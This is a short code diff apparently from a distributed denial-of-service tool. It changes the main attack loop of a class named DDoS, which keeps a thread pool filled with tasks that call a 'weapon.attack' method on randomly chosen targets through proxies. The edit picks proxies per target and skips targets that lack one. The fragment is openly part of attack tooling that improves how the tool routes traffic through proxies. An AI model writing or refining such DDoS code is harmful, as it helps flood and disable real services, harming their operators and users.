@@ -87,7 +87,12 @@ class DDoS:
 
         while True:
             while pool.get_len() < config.THREAD_COUNT:
-                pool.add_task(Task(self.__weapon.attack, args=(self.__target_manager.get_rand(), self.__proxy_manager.get_rand())))
+                target = self.__target_manager.get_rand()
+                proxy = self.__proxy_manager.get_rand(target)
+                if proxy != None:
+                    pool.add_task(Task(self.__weapon.attack, args=(target, proxy)))
+                else:
+                    console_log.warning('Skipped target: {0}'.format(target))
 
         pool.join()
 
